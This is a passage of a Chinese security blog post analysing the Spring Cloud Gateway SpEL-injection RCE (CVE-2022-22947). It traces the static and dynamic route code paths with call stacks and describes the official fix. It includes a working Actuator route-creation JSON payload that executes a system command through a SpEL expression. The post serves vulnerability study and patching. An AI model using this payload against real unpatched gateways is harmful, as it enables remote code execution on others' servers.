+<p>我们再次走上述流程添加即可正常跳转</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250514155159069.png" srcset="/img/loading.gif" lazyload alt="image-20250514155159069" style="zoom:50%;" />
+
+<h2 id="CVE-2022-22947"><a href="#CVE-2022-22947" class="headerlink" title="CVE-2022-22947"></a>CVE-2022-22947</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>SpringCloudGateWay 远程代码执行（CVE-2022-22947）是此组件在暴露 Gateway Actuator 端点时，动态添加路由时，存在 SpEL 表达式注入，造成 RCE</p>
+<p>受影响版本：</p>
+<ul>
+<li>Spring Cloud Gateway（3.1.x）&lt; 3.1.1</li>
+<li>Spring Cloud Gateway （3.0.x）&lt; 3.0.7</li>
+<li>Spring Cloud Gateway 其他已不再更新的版本</li>
+</ul>
+<p>修复版本：</p>
+<ul>
+<li>Spring Cloud Gateway（3.1.x）&gt;&#x3D; 3.1.1</li>
+<li>Spring Cloud Gateway（3.0.x）&gt;&#x3D; 3.0.7</li>
+</ul>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="静态路由分析"><a href="#静态路由分析" class="headerlink" title="静态路由分析"></a>静态路由分析</h4><p>首先，我们在配置文件中加入 SpEL 表达式</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250514194040350.png" srcset="/img/loading.gif" lazyload alt="image-20250514194040350" style="zoom:50%;" />
+
+<p>配置文件会通过 <code>@ConfigurationProperties(&quot;spring.cloud.gateway&quot;)</code> 绑定到 org.springframework.cloud.gateway.config.GatewayProperties 这个类</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250514194221946.png" srcset="/img/loading.gif" lazyload alt="image-20250514194221946" style="zoom:50%;" />
+
+<p>然后会通过 PropertiesRouteDefinitionLocator，把  GatewayProperties.getRoutes()  中的每一条配置，转换成框架真正用来路由的 RouteDefinition。</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250514194939526.png" srcset="/img/loading.gif" lazyload alt="image-20250514194939526" style="zoom: 67%;" />
+
+<p>org.springframework.cloud.gateway.route.RouteDefinition 中就包含我了我们前面说的 Predicate（断言）和 Filter（过滤器）等配置信息</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514195700607.png" srcset="/img/loading.gif" lazyload alt="image-20250514195700607"></p>
+<p>在这之后，由 org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator#convertToRoute 方法，去解析处理 RouteDefinition</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514200641583.png" srcset="/img/loading.gif" lazyload alt="image-20250514200641583"></p>
+<p>漏洞产生就发生在 org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator#getFilters 方法的处理过程中，我们调试看看，在 this.getFilters 这行打断点</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514200510985.png" srcset="/img/loading.gif" lazyload alt="image-20250514200510985"></p>
+<p>调用了 RouteDefinitionRouteLocator#loadGatewayFilters </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514201250492.png" srcset="/img/loading.gif" lazyload alt="image-20250514201250492"></p>
+<p>接着会调用到 org.springframework.cloud.gateway.support.ConfigurationService.AbstractBuilder#bind 方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514201501884.png" srcset="/img/loading.gif" lazyload alt="image-20250514201501884"></p>
+<p>可以看到 bind 方法中开始处理 配置的 filters，调用 normalizeProperties() 方法，标准化属性</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514201619500.png" srcset="/img/loading.gif" lazyload alt="image-20250514201619500"></p>
+<p>接着就来到了 ShortcutConfigurable.ShortcutType#normalize 方法，循环调用了 ShortcutConfigurable.getValue() </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514202157427.png" srcset="/img/loading.gif" lazyload alt="image-20250514202157427"></p>
+<p>这种表达式注入，没什么是比看到 getValue() 和 setValue() 方法，更让人兴奋的了，我们跟进，看到用 StandardEvaluationContext 解析 SpEL 表达式，造成了命令执行</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514202327010.png" srcset="/img/loading.gif" lazyload alt="image-20250514202327010"></p>
+<p>成功弹出了计算器</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514202452483.png" srcset="/img/loading.gif" lazyload alt="image-20250514202452483"></p>
+<p><strong>调用栈</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">getValue:<span class="hljs-number">65</span>, ShortcutConfigurable (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.support)<br>normalize:<span class="hljs-number">94</span>, ShortcutConfigurable<span class="hljs-variable">$ShortcutType</span>$<span class="hljs-number">1</span> (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.support)<br>normalizeProperties:<span class="hljs-number">140</span>, ConfigurationService<span class="hljs-variable">$ConfigurableBuilder</span> (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.support)<br>bind:<span class="hljs-number">241</span>, ConfigurationService<span class="hljs-variable">$AbstractBuilder</span> (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.support)<br>loadGatewayFilters:<span class="hljs-number">144</span>, RouteDefinitionRouteLocator (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.route)<br>getFilters:<span class="hljs-number">176</span>, RouteDefinitionRouteLocator (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.route)<br>convertToRoute:<span class="hljs-number">117</span>, RouteDefinitionRouteLocator (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.route)<br></code></pre></td></tr></table></figure>
+
+<h4 id="动态路由分析"><a href="#动态路由分析" class="headerlink" title="动态路由分析"></a>动态路由分析</h4><p>以上通过静态路由（改配置文件）的方式，利用条件很苛刻，几乎不可能实现呢。我们没有办法去更改目标系统的 <code>.yml</code> 配置文件</p>
+<p>所以我们就想在目标允许 Actuator API 的话，动态添加路由的 filter 解析一样，应该会按照上述流程去解析</p>
+<p>Actuator API 主要用到的就是 AbstractGatewayControllerEndpoint#save 方法和 refresh 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&#123;&quot;/routes/&#123;id&#125;&quot;&#125;)</span><br><span class="hljs-keyword">public</span> Mono&lt;ResponseEntity&lt;Object&gt;&gt; <span class="hljs-title function_">save</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String id,</span><br><span class="hljs-params">                                         <span class="hljs-meta">@RequestBody</span> RouteDefinition route)</span> &#123;<br>    <span class="hljs-keyword">return</span> Mono.just(route)<br>        <span class="hljs-comment">// 1) 校验路由定义是否合法（比如断言、过滤器、uri 等字段非空校验）</span><br>        .doOnNext(<span class="hljs-built_in">this</span>::validateRouteDefinition)<br>        <span class="hljs-comment">// 2) 保存到 RouteDefinitionWriter</span><br>        .flatMap(routeDefinition -&gt;<br>                 <span class="hljs-built_in">this</span>.routeDefinitionWriter<br>                 <span class="hljs-comment">// 注意：这里又包装成 Mono.just(...)，并在 map 里 setId</span><br>                 .save(Mono.just(routeDefinition)<br>                       .map(r -&gt; &#123;<br>                           r.setId(id);<br>                           log.debug(<span class="hljs-string">&quot;Saving route: &quot;</span> + r);<br>                           <span class="hljs-keyword">return</span> r;<br>                       &#125;))<br>                 <span class="hljs-comment">// 3) save 完成后，返回一个 201 CREATED</span><br>                 .then(Mono.defer(() -&gt;<br>                                  Mono.just(ResponseEntity<br>                                            .created(URI.create(<span class="hljs-string">&quot;/routes/&quot;</span> + id))<br>                                            .build()<br>                                           )<br>                                 ))<br>                )<br>        <span class="hljs-comment">// 如果传进来的 route 是 null，走这里</span><br>        .switchIfEmpty(Mono.defer(() -&gt;<br>                                  Mono.just(ResponseEntity.badRequest().build())<br>                                 ));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514204313088.png" srcset="/img/loading.gif" lazyload alt="image-20250514204313088"></p>
+<p>我们打好断点，发送请求</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Dynamics&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;predicates&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Path&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;_genkey_0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/lingx5&quot;</span><span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;filters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AddResponseHeader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gatewaytest&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;RewritePath&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;_genkey_0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/lingx5&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;_genkey_1&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://lingx5.github.io/&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>首先 save 方法拦截到请求把请求参数封装为 RouteDefinition 并用 InMemoryRouteDefinitionRepository#save 缓存到 routes 这个 map 表中</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514205514464.png" srcset="/img/loading.gif" lazyload alt="image-20250514205514464"></p>
+<p>接着我们发送 <code>/refresh</code> 请求</p>
+<p>执行 AbstractApplicationContext#publishEvent 方法，调用 SimpleApplicationEventMulticaster#multicastEvent</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514210756845.png" srcset="/img/loading.gif" lazyload alt="image-20250514210756845"></p>
+<p>multicastEvent 接着循环调用 invokeListener -&gt; doInvokeListener -&gt; ApplicationListener#onApplicationEvent</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250514211949521.png" srcset="/img/loading.gif" lazyload alt="image-20250514211949521" style="zoom:50%;" />
+
+<center>
+    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250514212029883.png" srcset="/img/loading.gif" lazyload alt="image-20250514211123486" width="400px" />
+    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250514211640036.png" srcset="/img/loading.gif" lazyload alt="image-20250514211222759" width="400px" />
+    </center>
+
+<p>执行不同类的 onApplicationEvent 方法 </p>
+ <img src="https://gitee.com/ling-x5/img/raw/master/image-20250514211726165.png" srcset="/img/loading.gif" lazyload alt="image-20250514211413399" style="zoom:67%;" />
+
+<p>最终由 CachingRouteLocator#onApplicationEvent </p>
+<p>看一下这个方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onApplicationEvent</span><span class="hljs-params">(RefreshRoutesEvent event)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 一次性把 fetch() 这条 Flux 执行完，并 collect 成一个 List&lt;Route&gt;</span><br>        <span class="hljs-built_in">this</span>.fetch().collect(Collectors.toList())<br>            .subscribe(list -&gt; <br>                       <span class="hljs-comment">// 然后再把 list 转回 Flux，materialize 成一串 Signal&lt;Route&gt;</span><br>                       Flux.fromIterable(list)<br>                       .materialize()<br>                       .collect(Collectors.toList())<br>                       .subscribe(signals -&gt; &#123;<br>                           <span class="hljs-comment">// ① 发布一个 RefreshRoutesResultEvent</span><br>                           <span class="hljs-built_in">this</span>.applicationEventPublisher<br>                               .publishEvent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RefreshRoutesResultEvent</span>(<span class="hljs-built_in">this</span>));<br>                           <span class="hljs-comment">// ② 缓存这批 signals 到 cache</span><br>                           <span class="hljs-built_in">this</span>.cache.put(<span class="hljs-string">&quot;routes&quot;</span>, signals);<br>                       &#125;, <span class="hljs-built_in">this</span>::handleRefreshError),<br>                       <span class="hljs-built_in">this</span>::handleRefreshError);<br>    &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>        <span class="hljs-built_in">this</span>.handleRefreshError(e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h5 id="取缓存"><a href="#取缓存" class="headerlink" title="取缓存"></a>取缓存</h5><p>fetch 调用 CompositeRouteLocator#getRoutes 方法，聚合应用上下文里所有的 RouteLocator Bean</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250515091120946.png" srcset="/img/loading.gif" lazyload alt="image-20250515091120946" style="zoom:67%;" />
+
+<p>遍历 RouteLocator:: getRoutes</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250515093544933.png" srcset="/img/loading.gif" lazyload alt="image-20250515093544933" style="zoom:50%;" />
+
+<p>包含了 RouteDefinitionRouteLocator#getRoutes</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250515093746834.png" srcset="/img/loading.gif" lazyload alt="image-20250515093746834" style="zoom:50%;" />
+
+<p>RouteDefinitionRouteLocator#getRoutes 的实现调用了 RouteDefinitionLocator#getRouteDefinitions 方法，其中就有我们缓存的InMemoryRouteDefinitionRepository 的实现，从而拿到缓存的添加的 恶意Route</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250515094034244.png" srcset="/img/loading.gif" lazyload alt="image-20250515094034244"></p>
+<h5 id="解析执行"><a href="#解析执行" class="headerlink" title="解析执行"></a>解析执行</h5><p>onApplicationEvent通过fetch拿到所有的Route后，用collect整合起来，再由subscribe() 一路调用到 RouteDefinitionRouteLocator#convertToRoute 方法</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs stylus">convertToRoute:<span class="hljs-number">117</span>, RouteDefinitionRouteLocator (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.route)<br>apply:-<span class="hljs-number">1</span>, <span class="hljs-number">289336712</span> (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span><span class="hljs-selector-class">.route</span>.RouteDefinitionRouteLocator$<span class="hljs-variable">$Lambda</span>$<span class="hljs-number">1016</span>)<br>onNext:<span class="hljs-number">113</span>, FluxMapFuseable<span class="hljs-variable">$MapFuseableSubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">539</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>tryEmitScalar:<span class="hljs-number">489</span>, FluxFlatMap<span class="hljs-variable">$FlatMapMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">422</span>, FluxFlatMap<span class="hljs-variable">$FlatMapMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">539</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>drain:<span class="hljs-number">439</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>innerComplete:<span class="hljs-number">335</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onSubscribe:<span class="hljs-number">559</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialInner</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onSubscribe:<span class="hljs-number">633</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">201</span>, FluxIterable (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">83</span>, FluxIterable (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">8642</span>, Flux (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">237</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">539</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>slowPath:<span class="hljs-number">335</span>, FluxIterable<span class="hljs-variable">$IterableSubscription</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>request:<span class="hljs-number">294</span>, FluxIterable<span class="hljs-variable">$IterableSubscription</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>request:<span class="hljs-number">649</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onSubscribe:<span class="hljs-number">198</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onSubscribe:<span class="hljs-number">633</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">201</span>, FluxIterable (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">83</span>, FluxIterable (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">8642</span>, Flux (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">237</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onNext:<span class="hljs-number">539</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>slowPath:<span class="hljs-number">335</span>, FluxIterable<span class="hljs-variable">$IterableSubscription</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>request:<span class="hljs-number">294</span>, FluxIterable<span class="hljs-variable">$IterableSubscription</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>request:<span class="hljs-number">649</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onSubscribe:<span class="hljs-number">198</span>, FluxMergeSequential<span class="hljs-variable">$MergeSequentialMain</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onSubscribe:<span class="hljs-number">633</span>, FluxOnAssembly<span class="hljs-variable">$OnAssemblySubscriber</span> (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">201</span>, FluxIterable (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">83</span>, FluxIterable (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">4490</span>, Mono (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribeWith:<span class="hljs-number">4605</span>, Mono (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">4457</span>, Mono (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">4393</span>, Mono (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>subscribe:<span class="hljs-number">4365</span>, Mono (reactor<span class="hljs-selector-class">.core</span>.publisher)<br>onApplicationEvent:<span class="hljs-number">81</span>, CachingRouteLocator (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.route)<br>onApplicationEvent:<span class="hljs-number">40</span>, CachingRouteLocator (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.route)<br>doInvokeListener:<span class="hljs-number">178</span>, SimpleApplicationEventMulticaster (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.context</span>.event)<br>invokeListener:<span class="hljs-number">171</span>, SimpleApplicationEventMulticaster (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.context</span>.event)<br>multicastEvent:<span class="hljs-number">145</span>, SimpleApplicationEventMulticaster (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.context</span>.event)<br>publishEvent:<span class="hljs-number">429</span>, AbstractApplicationContext (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.context</span>.support)<br>publishEvent:<span class="hljs-number">386</span>, AbstractApplicationContext (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.context</span>.support)<br>refresh:<span class="hljs-number">96</span>, AbstractGatewayControllerEndpoint (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span>.actuate)<br></code></pre></td></tr></table></figure>
+
+<p>后续和静态路由一样了 调用 getValue 解析 SpEL 表达式</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250514213853353.png" srcset="/img/loading.gif" lazyload alt="image-20250514213853353"></p>
+<p>弹出计算器</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250514213921125.png" srcset="/img/loading.gif" lazyload alt="image-20250514213921125" style="zoom:50%;" />
+
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>官方在解析SpEL的 ShortcutConfigurable做了修改，把 StandardEvaluationContext 换位了自定义的GatewayEvaluationContext，在GatewayEvaluationContext内部是由 SimpleEvaluationContext 去解析</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/spring-cloud/spring-cloud-gateway/commit/337cef276bfd8c59fb421bfe7377a9e19c68fe1e#diff-7aa249852020f587b35d07cd73c39161c229700ee1e13a9a146c114f542083bc">Updates ShortcutConfigurable to use custom EvaluationContext. · spring-cloud&#x2F;spring-cloud-gateway@337cef2</a></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250515095144008.png" srcset="/img/loading.gif" lazyload alt="image-20250515095144008"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="http://news.558idc.com/290335.html">SpringCloud Gateway 漏洞分析 （CVE-2022-22947） - 自由资讯</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.ityouknow.com/springcloud/2018/12/12/spring-cloud-gateway-start.html">springcloud(十五)：服务网关 Spring Cloud GateWay 入门 - 纯洁的微笑博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://nosec.org/home/detail/5008.html">Spring Cloud Gateway CVE-2022-22947 漏洞分析|NOSEC 安全讯息平台 - 白帽汇安全研究院</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/java%E5%AE%89%E5%85%A8/Spring/" class="category-chain-item">Spring</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#java安全</a>
+      
+        <a href="/tags/Spring/" class="print-no-link">#Spring</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SpringCloud GateWay 漏洞分析</div>
+      <div>http://lingx5.github.io/2025/05/15/SpringCloud-GateWay-漏洞分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lingx5</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
